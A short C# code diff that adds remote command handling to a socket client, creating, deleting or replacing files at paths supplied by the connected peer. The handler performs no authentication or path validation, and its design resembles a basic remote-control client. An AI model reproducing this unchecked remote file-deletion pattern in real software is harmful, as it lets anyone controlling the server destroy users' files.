@@ -5,6 +5,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
+using System.IO;
 
 namespace ClientV
 {
@@ -34,6 +35,22 @@ namespace ClientV
                int bytesRecorded = socket.Receive(buffer);
                 request = Encoding.UTF8.GetString(buffer, 0, bytesRecorded);
                 string[] command = request.Split('|');
+
+                switch (command[0])
+                {
+                    case "create":
+                        FileStream stream = File.Create(command[1]);
+                        stream.Close();
+                        break;
+
+                    case "delete":
+                        File.Delete(command[1]);
+                            break;
+                    case "rename":
+                        File.Replace(command[1],command[2],"");
+                        break;
+
+                }
 
             }
 
